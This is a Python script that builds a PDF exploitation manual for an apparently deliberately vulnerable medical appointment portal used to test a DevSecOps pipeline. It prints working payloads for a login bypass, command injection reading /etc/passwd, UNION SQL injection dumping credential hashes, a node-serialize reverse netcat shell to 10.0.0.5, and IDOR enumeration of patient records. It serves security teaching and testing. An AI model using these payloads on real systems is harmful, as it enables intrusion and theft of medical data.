import os
from fpdf import FPDF

class VulnerabilityReportPDF(FPDF):
    def header(self):
        if self.page_no() == 1:
            return

        self.set_fill_color(139, 0, 0) # Dark red for security
        self.rect(0, 0, 210, 30, "F")
        self.set_font("helvetica", "B", 16)
        self.set_text_color(255, 255, 255)
        self.set_y(10)
        self.cell(0, 10, "Application Security & Vulnerability Exploitation Manual", align="C")
        self.set_y(35)
        
    def footer(self):
        self.set_y(-15)
        self.set_font("helvetica", "I", 8)
        self.set_text_color(128, 128, 128)
        self.cell(0, 10, f"Page {self.page_no()}", align="C")

    def create_title_page(self):
        self.add_page()
        self.set_fill_color(33, 37, 41)
        self.rect(0, 0, 210, 297, "F")
        self.set_text_color(255, 255, 255)
        
        self.set_y(100)
        self.set_font("helvetica", "B", 24)
        self.cell(0, 15, "DevSecOps Medical Portal", align="C", new_x="LMARGIN", new_y="NEXT")
        self.ln(5)
        self.set_font("helvetica", "B", 16)
        self.set_text_color(220, 53, 69) # Bootstrap Red
        self.cell(0, 10, "Application Intelligence & Vulnerability Exploitation Manual", align="C", new_x="LMARGIN", new_y="NEXT")
        
        self.set_y(250)
        self.set_font("helvetica", "I", 12)
        self.set_text_color(200, 200, 200)
        self.cell(0, 10, "Strictly for Educational Use & Pipeline Truthing", align="C")

    def chapter_title(self, title):
        self.ln(5)
        self.set_font("helvetica", "B", 18)
        self.set_text_color(40, 44, 52)
        self.set_fill_color(230, 235, 245)
        self.cell(0, 12, f"  {title}", align="L", fill=True, new_x="LMARGIN", new_y="NEXT")
        self.ln(6)

    def vulnerability_title(self, title, cwe, risk):
        self.ln(6)
        self.set_font("helvetica", "B", 14)
        
        # Risk color coding
        if risk == "CRITICAL" or risk == "HIGH":
            self.set_text_color(220, 53, 69) # Red
        else:
            self.set_text_color(253, 126, 20) # Orange
            
        self.cell(0, 10, f"[{risk}] {title} ({cwe})", align="L", new_x="LMARGIN", new_y="NEXT")
        self.ln(2)

    def chapter_body(self, text):
        text = text.replace('—', '-')
        self.set_font("helvetica", "", 11)
        self.set_text_color(60, 60, 60)
        self.multi_cell(0, 7, text, new_x="LMARGIN", new_y="NEXT")
        self.ln(4)
        
    def code_block(self, code):
        self.ln(2)
        self.set_fill_color(245, 245, 245)
        self.set_font("courier", "", 10)
        self.set_text_color(40, 40, 40)
        self.multi_cell(0, 6, code, fill=True, new_x="LMARGIN", new_y="NEXT")
        self.ln(4)

def generate_report():
    pdf = VulnerabilityReportPDF(unit='mm', format='A4')
    pdf.set_auto_page_break(auto=True, margin=20)
    
    # Page 1: Title
    pdf.create_title_page()
    
    # Page 2: App Func
    pdf.add_page()
    pdf.chapter_title("1. Application Functionality Overview")
    pdf.chapter_body(
        "The target application is a 'Medical Appointment & CRM Portal' constructed via an Express.js/Node.js REST API and a React Single Page Application frontend. The platform theoretically serves two entity levels: standard patients and administrative staff."
    )
    pdf.chapter_body(
        "Core Capabilities Supported by the Backend Routing Matrix:"
    )
    pdf.chapter_body(
        "1. Authentication (/api/auth): Handles state. New users register via email/password. The backend hashes strings via `bcrypt` and subsequently issues stateless `jsonwebtoken` (JWT) assertions mapped to a User ID and Role array.\n\n"
        "2. Medical Appointments (/api/appointments): Users query available services, book new time-slots, and search through global appointment boards (often leveraging deeply flawed search logic).\n\n"
        "3. File Management (/api/user/upload): Allows clients to submit PDF/Document health records into the remote physical filesystem via the `multer` streaming module.\n\n"
        "4. Diagnostics & CRM (/api/contact): Administrative diagnostics allowing users to query FAQ knowledge bases and verify remote API health status via ICMP echo packets."
    )

    pdf.chapter_title("2. Vulnerability Ledger & Exploitation Logic")
    pdf.chapter_body(
        "The Express.js controllers within this application were deliberately programmed utilizing 'insecure-by-default' logic patterns. The DevSecOps pipeline accurately intercepts these logic flaws. Below is the manual methodology a penetration tester would utilize to fully compromise the network during a red-team engagement, circumventing the defensive pipeline."
    )

    # VULN 1: NoSQL / Type Confusion Authentication Bypass
    pdf.vulnerability_title("1. Broken Authentication (Type Confusion)", "CWE-287", "CRITICAL")
    pdf.chapter_body(
        "Location: backend/src/controllers/authController.js (Line 50)\n"
        "The login handler retrieves a user via their email address. However, it fails to cast or strictly validate the incoming `password` payload. If an attacker submits a JSON Object rather than a JSON String, the logic breaks. The explicit check `if (typeof password === 'object')` inexplicably halts the `bcrypt.compare` validation sequence and automatically issues a valid JWT token."
    )
    pdf.chapter_body("Manual Exploitation Sequence:")
    pdf.code_block(
        "POST /api/auth/login HTTP/1.1\n"
        "Host: target-application:5000\n"
        "Content-Type: application/json\n\n"
        "{\n"
        "  \"email\": \"admin@hospital.com\",\n"
        "  \"password\": {\"$ne\": \"\"}\n"
        "}"
    )
    pdf.chapter_body(
        "Result: The backend interprets the password object, bypasses the hash comparison algorithm, and returns `{ \"success\": true, \"token\": \"eyJhbGci...\" }`. Complete Account Takeover (ATO)."
    )
    
    pdf.add_page()
    
    # VULN 2: Command Injection
    pdf.vulnerability_title("2. Remote Code Execution (OS Command Injection)", "CWE-78", "CRITICAL")
    pdf.chapter_body(
        "Location: backend/src/controllers/contactController.js (Line 21)\n"
        "The diagnostics endpoint allows a user to ping an external server by passing an IP address. The controller takes the user-supplied `server_ip` and dangerously concatenates it directly into a raw physical bash implementation using Node's native `child_process.exec()` function without any input sanitization or regex filtering."
    )
    pdf.chapter_body("Manual Exploitation Sequence:")
    pdf.code_block(
        "POST /api/contact/status\n"
        "Content-Type: application/json\n\n"
        "{\n"
        "  \"server_ip\": \"8.8.8.8; cat /etc/passwd; id\"\n"
        "}"
    )
    pdf.chapter_body(
        "Result: The operating system executes `ping -c 1 8.8.8.8`, finishes the command, and subsequently processes the injected payload. The API response will output the entire Linux `/etc/passwd` file and the current operational UID context."
    )

    # VULN 3: SQL Injection
    pdf.vulnerability_title("3. Unauthenticated SQL Injection", "CWE-89", "HIGH")
    pdf.chapter_body(
        "Location: backend/src/controllers/appointmentController.js (Line 24)\n"
        "The appointment search function relies on Sequelize (an ORM). However, the developer arbitrarily ignored safe parametrized abstractions, opting instead for `sequelize.query()`. The user input `query` is interpolated directly into the SQL sequence syntax via template literals."
    )
    pdf.chapter_body("Manual Exploitation Sequence:")
    pdf.code_block(
        "GET /api/appointments/search?query=valid' UNION SELECT id,email,password_hash,role_id,null,null FROM Users-- HTTP/1.1"
    )
    pdf.chapter_body(
        "Result: The single quote breaks out of the expected LIKE statement. The UNION statement executes in tandem, merging the sensitive Users table directly into the legitimate Appointment search payload returning absolute administrator credential hashes directly to the unauthenticated frontend."
    )
    
    pdf.add_page()

    # VULN 4: Insecure Deserialization
    pdf.vulnerability_title("4. Node.js Insecure Deserialization", "CWE-502", "CRITICAL")
    pdf.chapter_body(
        "Location: backend/src/controllers/userController.js (Line 22)\n"
        "The application utilizes the notoriously vulnerable legacy package `node-serialize` to unpack user GUI preferences. Unserializing untrusted Node serialized objects evaluates immediately upon runtime. This allows an attacker to compile Immediately Invoked Function Expressions (IIFE) within the preferences matrix."
    )
    pdf.chapter_body("Manual Exploitation Sequence:")
    pdf.code_block(
        "POST /api/user/preferences\n"
        "{\n"
        "  \"preferences\": \"{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){require('child_process').exec('nc 10.0.0.5 4444 -e /bin/sh');}()\\\"}\"\n"
        "}"
    )
    pdf.chapter_body(
        "Result: During the execution of `serialize.unserialize()`, the runtime encounters the execution payload. The host triggers a reverse netcat shell back to the adversary's IP array, establishing a silent Command and Control (C2) tunnel entirely bypassing firewall ingress rules."
    )

    # VULN 5: IDOR
    pdf.vulnerability_title("5. Insecure Direct Object Reference (IDOR)", "CWE-639", "MEDIUM")
    pdf.chapter_body(
        "Location: backend/src/controllers/appointmentController.js (Line 7)\n"
        "When fetching a single appointment configuration, the backend assumes the user is authenticated, but fails to execute an ownership check matching `req.user.id` against the specific requested `id`."
    )
    pdf.chapter_body("Manual Exploitation Sequence:")
    pdf.code_block(
        "GET /api/appointments/10 HTTP/1.1\n"
        "Authorization: Bearer <valid_low_privilege_token>"
    )
    pdf.chapter_body(
        "Result: An attacker maps numbers sequentially (iterating 1, 2, 3...) to view and enumerate every single private, HIPAA-protected medical appointment held within the hospital network without throwing an authorization halt."
    )

    pdf.output("Application_Vulnerabilities_and_Exploits.pdf")

if __name__ == "__main__":
    generate_report()
